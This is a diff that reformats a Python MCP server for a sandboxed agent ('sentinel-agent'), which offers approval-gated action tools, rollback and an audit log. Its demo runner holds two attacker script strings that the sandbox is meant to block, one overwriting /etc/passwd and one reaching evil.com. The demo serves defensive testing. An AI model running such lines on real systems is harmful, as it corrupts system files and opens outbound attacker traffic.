@@ -10,6 +10,7 @@ Methods:
   health             — engine stats + sandbox writability
   shutdown           — clean exit (for tests)
 """
+
 from __future__ import annotations
 
 import asyncio
@@ -39,40 +40,56 @@ def _ok(rid: Any, result: Any) -> dict:
 
 # ── MCP method handlers ────────────────────────────────────────────────────
 async def _initialize(params: dict, _engine: Engine) -> dict:
-    return {"protocolVersion": "2024-11-05",
-            "capabilities": {"tools": {}},
-            "serverInfo": {"name": "sentinel-agent", "version": VERSION}}
+    return {
+        "protocolVersion": "2024-11-05",
+        "capabilities": {"tools": {}},
+        "serverInfo": {"name": "sentinel-agent", "version": VERSION},
+    }
 
 
 async def _tools_list(params: dict, _engine: Engine) -> dict:
-    return {"tools": [
-        {"name": "apply_system_change",
-         "description": ("Execute a frozen action template inside the Vultr "
-                         "sandbox (fs=/scratch, net=Atlassian+Vultr, 30s wall, "
-                         "256MB heap). Destructive actions require approval_token."),
-         "inputSchema": {"type": "object",
-                         "required": ["action", "params"],
-                         "properties": {
-                             "action": {"type": "string",
-                                        "enum": [a["name"] for a in list_actions()]},
-                             "params": {"type": "object"},
-                             "dryRun": {"type": "boolean", "default": True},
-                             "approval_token": {"type": "string"}}}},
-        {"name": "propose_actions",
-         "description": "Poll Confluence via Atlassian MCP and propose actions.",
-         "inputSchema": {"type": "object",
-                         "properties": {"max_pages": {"type": "number", "default": 5}}}},
-        {"name": "rollback_last",
-         "description": "Rollback all WAL-tracked mutations.",
-         "inputSchema": {"type": "object", "properties": {}}},
-        {"name": "audit_tail",
-         "description": "Return last N append-only audit entries.",
-         "inputSchema": {"type": "object",
-                         "properties": {"n": {"type": "number", "default": 20}}}},
-        {"name": "wal_stats",
-         "description": "Return WAL backend, pending snapshots, and file size.",
-         "inputSchema": {"type": "object", "properties": {}}},
-    ]}
+    return {
+        "tools": [
+            {
+                "name": "apply_system_change",
+                "description": (
+                    "Execute a frozen action template inside the Vultr "
+                    "sandbox (fs=/scratch, net=Atlassian+Vultr, 30s wall, "
+                    "256MB heap). Destructive actions require approval_token."
+                ),
+                "inputSchema": {
+                    "type": "object",
+                    "required": ["action", "params"],
+                    "properties": {
+                        "action": {"type": "string", "enum": [a["name"] for a in list_actions()]},
+                        "params": {"type": "object"},
+                        "dryRun": {"type": "boolean", "default": True},
+                        "approval_token": {"type": "string"},
+                    },
+                },
+            },
+            {
+                "name": "propose_actions",
+                "description": "Poll Confluence via Atlassian MCP and propose actions.",
+                "inputSchema": {"type": "object", "properties": {"max_pages": {"type": "number", "default": 5}}},
+            },
+            {
+                "name": "rollback_last",
+                "description": "Rollback all WAL-tracked mutations.",
+                "inputSchema": {"type": "object", "properties": {}},
+            },
+            {
+                "name": "audit_tail",
+                "description": "Return last N append-only audit entries.",
+                "inputSchema": {"type": "object", "properties": {"n": {"type": "number", "default": 20}}},
+            },
+            {
+                "name": "wal_stats",
+                "description": "Return WAL backend, pending snapshots, and file size.",
+                "inputSchema": {"type": "object", "properties": {}},
+            },
+        ]
+    }
 
 
 async def _tools_call(params: dict, engine: Engine) -> dict:
@@ -90,8 +107,7 @@ async def _tools_call(params: dict, engine: Engine) -> dict:
         result = await engine.wal.stats()
     else:
         raise LookupError(f"unknown_tool:{name}")
-    return {"content": [{"type": "text",
-                         "text": json.dumps(result, default=str)}]}
+    return {"content": [{"type": "text", "text": json.dumps(result, default=str)}]}
 
 
 async def _health(params: dict, engine: Engine) -> dict:
@@ -142,8 +158,7 @@ async def _handle_one(req: Any, engine: Engine) -> dict | None:
     except LookupError as e:
         return _err(req.get("id"), -32601, str(e))
     except Exception as e:
-        return _err(req.get("id"), -32603, str(e),
-                    data=getattr(e, "code", None))
+        return _err(req.get("id"), -32603, str(e), data=getattr(e, "code", None))
 
     if "id" not in req or req["id"] is None:
         return None
@@ -168,8 +183,7 @@ class _Server:
         stdin = stdin or sys.stdin
         stdout = stdout or sys.stdout
         self.install_signals()
-        await audit({"kind": "boot", "version": VERSION,
-                     "methods": list(_HANDLERS)})
+        await audit({"kind": "boot", "version": VERSION, "methods": list(_HANDLERS)})
         loop = asyncio.get_running_loop()
         while not self._shutdown.is_set():
             line = await loop.run_in_executor(None, stdin.readline)
@@ -192,6 +206,7 @@ async def serve(stdin=None, stdout=None) -> None:
 # ── Demo runner ───────────────────────────────────────────────────────────
 async def _demo() -> None:
     import os
+
     os.environ.setdefault("SENTINEL_DEMO", "1")
     engine = Engine()
     line = "─" * 64
@@ -199,29 +214,28 @@ async def _demo() -> None:
 
     print("\n▸ VULTR: attacker tries /etc/passwd via run_script")
     evil_fs = "open('/etc/passwd','w').write('owned')"
-    r1 = await dispatch(engine, {"action": "sandbox.run_script",
-                                 "params": {"script": evil_fs},
-                                 "dryRun": False})
+    r1 = await dispatch(engine, {"action": "sandbox.run_script", "params": {"script": evil_fs}, "dryRun": False})
     print("  →", json.dumps(r1.get("error")))
 
     print("\n▸ VULTR: attacker tries egress to evil.com")
     evil_net = "import urllib.request; urllib.request.urlopen('https://evil.com')"
-    r2 = await dispatch(engine, {"action": "sandbox.run_script",
-                                 "params": {"script": evil_net},
-                                 "dryRun": False})
+    r2 = await dispatch(engine, {"action": "sandbox.run_script", "params": {"script": evil_net}, "dryRun": False})
     print("  →", r2.get("error", {}).get("code"))
 
     print("\n▸ VULTR: benign script runs; minifier strips noise")
-    benign = ("print('hello from sandbox')\n"
-              "for i in range(200): print(f'noise-{i}')\n"
-              "raise RuntimeError('simulated failure at line 3')")
-    r3 = await dispatch(engine, {"action": "sandbox.run_script",
-                                 "params": {"script": benign},
-                                 "dryRun": False})
-    out = ((r3.get("result") or {}).get("output")
-           or (r3.get("error") or {}).get("output") or {})
-    print("  → exit:", (r3.get("result") or {}).get("receipt", {}).get("exit_code"),
-          "| dropped bytes:", out.get("dropped_bytes", 0))
+    benign = (
+        "print('hello from sandbox')\n"
+        "for i in range(200): print(f'noise-{i}')\n"
+        "raise RuntimeError('simulated failure at line 3')"
+    )
+    r3 = await dispatch(engine, {"action": "sandbox.run_script", "params": {"script": benign}, "dryRun": False})
+    out = (r3.get("result") or {}).get("output") or (r3.get("error") or {}).get("output") or {}
+    print(
+        "  → exit:",
+        (r3.get("result") or {}).get("receipt", {}).get("exit_code"),
+        "| dropped bytes:",
+        out.get("dropped_bytes", 0),
+    )
 
     print("\n▸ CODEGEIST: proposing from Confluence")
     prop = await propose(engine, {"max_pages": 3})
@@ -230,20 +244,19 @@ async def _demo() -> None:
 
     print("\n▸ CODEGEIST: approving only proposal #1")
     pick = prop["proposals"][0]
-    r4 = await dispatch(engine, {"action": pick["action"],
-                                 "params": pick["params"],
-                                 "dryRun": False,
-                                 "approval_token": "human-demo"})
-    print("  → receipt:",
-          json.dumps(r4.get("result", {}).get("receipt") or r4.get("error")))
+    r4 = await dispatch(
+        engine, {"action": pick["action"], "params": pick["params"], "dryRun": False, "approval_token": "human-demo"}
+    )
+    print("  → receipt:", json.dumps(r4.get("result", {}).get("receipt") or r4.get("error")))
 
     print("\n▸ CODEGEIST: rollback")
     print("  →", json.dumps(await engine.rollback()))
 
     print("\n▸ audit tail (last 5):")
     for e in await tail(5):
-        print(" ", (e.get("phase") or e.get("kind", "")).ljust(22),
-              (e.get("action") or "").ljust(28), e.get("error", ""))
+        print(
+            " ", (e.get("phase") or e.get("kind", "")).ljust(22), (e.get("action") or "").ljust(28), e.get("error", "")
+        )
 
     print("\n▸ engine stats:", json.dumps(engine.stats()))
     print(f"\n▸ registered templates: {len(list_actions())}")
@@ -270,6 +283,7 @@ async def handle_client(reader: asyncio.StreamReader, writer: asyncio.StreamWrit
     writer.close()
     await writer.wait_closed()
 
+
 async def _serve_tcp(host: str = "0.0.0.0", port: int = 8081) -> None:
     engine = Engine()
     stop = asyncio.Event()
@@ -280,12 +294,9 @@ async def _serve_tcp(host: str = "0.0.0.0", port: int = 8081) -> None:
         except (NotImplementedError, RuntimeError):
             pass
 
-    await audit({"kind": "boot", "version": VERSION,
-                 "transport": f"tcp://{host}:{port}",
-                 "methods": list(_HANDLERS)})
+    await audit({"kind": "boot", "version": VERSION, "transport": f"tcp://{host}:{port}", "methods": list(_HANDLERS)})
 
-    async def _on_client(r: asyncio.StreamReader,
-                         w: asyncio.StreamWriter) -> None:
+    async def _on_client(r: asyncio.StreamReader, w: asyncio.StreamWriter) -> None:
         await handle_client(r, w, engine)
 
     server = await asyncio.start_server(_on_client, host, port)
